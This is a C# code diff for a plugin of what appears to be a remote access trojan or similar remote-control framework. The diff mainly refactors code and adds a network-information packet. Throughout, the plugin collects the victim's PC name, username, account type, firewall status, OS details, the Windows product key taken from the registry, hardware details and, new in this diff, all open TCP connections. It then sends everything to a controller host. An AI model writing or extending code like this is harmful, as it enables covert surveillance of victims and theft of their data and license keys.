@@ -22,37 +22,47 @@ namespace Plugin
 
         public static void Main(LoadingAPI loadingAPI)
         {
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
                 case PacketType.MISC_INFORMATION:
                     cpuInformation.Add("CPU", new List<string>());
                     string s = HardwareInformation.CPUInformation();
                     cpuInformation["CPU"].Add(s);
-                    InformationPacket informationPacket = new InformationPacket(cpuInformation, loadingAPI.baseIp, loadingAPI.HWID);
+                    InformationPacket informationPacket = new InformationPacket(cpuInformation, loadingAPI.BaseIp, loadingAPI.HWID);
 
-                    informationPacket.information.systemInformation.systemInformation = new Dictionary<string, string>();
-                    informationPacket.information.systemInformation.systemInformation.Add("PC name", Helpers.GetPcName());
-                    informationPacket.information.systemInformation.systemInformation.Add("Username", Helpers.GetUserName());
-                    informationPacket.information.systemInformation.systemInformation.Add("Registered user", Helpers.GetWMIInformation("RegisteredUser"));
-                    informationPacket.information.systemInformation.systemInformation.Add("Account type", Helpers.GetUserType().ToString());
-                    informationPacket.information.systemInformation.systemInformation.Add("Firewall", Helpers.GetFirewall());
+                    informationPacket.information.systemInformation.systemInformation = new Dictionary<string, string>
+                    {
+                        { "PC name", Helpers.GetPcName() },
+                        { "Username", Helpers.GetUserName() },
+                        { "Registered user", Helpers.GetWMIInformation("RegisteredUser") },
+                        { "Account type", Helpers.GetUserType().ToString() },
+                        { "Firewall", Helpers.GetFirewall() },
 
-                    informationPacket.information.systemInformation.systemInformation.Add("System drive", Helpers.GetWMIInformation("SystemDrive"));
-                    informationPacket.information.systemInformation.systemInformation.Add("System path", Helpers.GetWMIInformation("SystemDirectory"));
-                    informationPacket.information.systemInformation.systemInformation.Add("OS architecture", Helpers.GetWMIInformation("OSArchitecture"));
-                    informationPacket.information.systemInformation.systemInformation.Add("System version", Helpers.GetWMIInformation("Version"));
-                    informationPacket.information.systemInformation.systemInformation.Add("OS type", Helpers.GetOsType());
-                    informationPacket.information.systemInformation.systemInformation.Add("OS manufacturer", Helpers.GetWMIInformation("Manufacturer"));
-                    informationPacket.information.systemInformation.systemInformation.Add("OS name", Helpers.GetWMIInformation("Caption"));
-                    informationPacket.information.systemInformation.systemInformation.Add("OS activation key", ActivationKey.GetWindowsProductKeyFromRegistry());
+                        { "System drive", Helpers.GetWMIInformation("SystemDrive") },
+                        { "System path", Helpers.GetWMIInformation("SystemDirectory") },
+                        { "OS architecture", Helpers.GetWMIInformation("OSArchitecture") },
+                        { "System version", Helpers.GetWMIInformation("Version") },
+                        { "OS type", Helpers.GetOsType() },
+                        { "OS manufacturer", Helpers.GetWMIInformation("Manufacturer") },
+                        { "OS name", Helpers.GetWMIInformation("Caption") },
+                        { "OS activation key", ActivationKey.GetWindowsProductKeyFromRegistry() },
+                        { "Debug", Helpers.GetDebug() }
+                    };
 
-                    informationPacket.information.hardwareInformation.hardwareInformation = new Dictionary<string, string>();
-                    informationPacket.information.hardwareInformation.hardwareInformation.Add("GPU", Helpers.GetGpuName());
-                    informationPacket.information.hardwareInformation.hardwareInformation.Add("Resolution", Helpers.GetResolution());
-                    informationPacket.information.hardwareInformation.hardwareInformation.Add("Motherboard", Helpers.GetMainboardName());
-                    informationPacket.information.hardwareInformation.hardwareInformation.Add("Bios", Helpers.GetBiosDescription());
+                    informationPacket.information.hardwareInformation.hardwareInformation = new Dictionary<string, string>
+                    {
+                        { "GPU", Helpers.GetGpuName() },
+                        { "Resolution", Helpers.GetResolution() },
+                        { "Motherboard", Helpers.GetMainboardName() },
+                        { "Bios", Helpers.GetBiosDescription() }
+                    };
 
-                    ClientSender(loadingAPI.host, loadingAPI.key, informationPacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, informationPacket);
+                    break;
+
+                case PacketType.MISC_NETWORK_INFORMATION:
+                    NetworkInformationPacket networkInformationPacket = new NetworkInformationPacket(NetworkInformation.AllTCPConnection(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, networkInformationPacket);
                     break;
 
                 default:
